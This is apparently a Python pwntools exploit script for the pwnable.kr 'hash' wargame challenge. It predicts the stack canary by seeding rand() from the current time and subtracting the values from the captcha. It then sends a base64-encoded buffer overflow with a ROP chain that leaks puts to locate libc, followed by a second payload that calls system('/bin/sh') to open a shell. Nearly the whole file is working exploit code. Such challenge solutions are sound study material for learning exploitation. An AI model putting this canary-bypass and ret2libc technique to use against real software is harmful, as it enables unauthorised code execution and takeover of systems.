#!/usr/bin/python3
from pwn import *
from base64 import *
from ctypes import CDLL

context.log_level = "debug"
context.arch = "i386"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
e = ELF("./hash")
dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
p=process("./hash")
# p = remote("pwnable.kr", 9002)

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

def calc_canary(captcha):
    dll.srand(dll.time(0))
    dll.rand()
    a = [dll.rand() for i in range(7)]
    canary = captcha - (a[0] + a[1] - a[2] + a[3] + a[4] - a[5] + a[6])
    canary = canary & 0xffffffff
    return canary

ru(": ")
captcha = int(ru("\n").strip().decode())
info(str(captcha))

canary = calc_canary(captcha)
info(str(canary))

# gdb.attach(p)

sl(str(captcha))
rop = ROP(e)
rop.call(e.plt["puts"], [e.got["puts"]])
rop.call((rop.find_gadget(["ret"]))[0])
rop.call(e.symbols["process_hash"])

payload = b64encode(b"A"*512 + p32(canary) + b"B"*12 + flat(rop.chain()))
sla("me!\n", payload)
ru("\n")
puts = u32(r(4))
info(str(hex(puts)))
libc.address = puts - 0x5fcb0
info(str(hex(libc.address)))

# gdb.attach(p)
ret = libc.address + 0x00000417
system = libc.address + 0x3adb0
binsh = libc.address + 0x15bb2b

# l = ROP(libc)
# l.call(l.find_gadget(["ret"])[0])
# l.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
payload2 = b64encode(b"A"*512 + p32(canary) + b"B"*12
    + p32(system)
    + p32(ret)
    + p32(binsh)
)
sl(b"\n"+payload2)
ru("\n")

p.interactive()
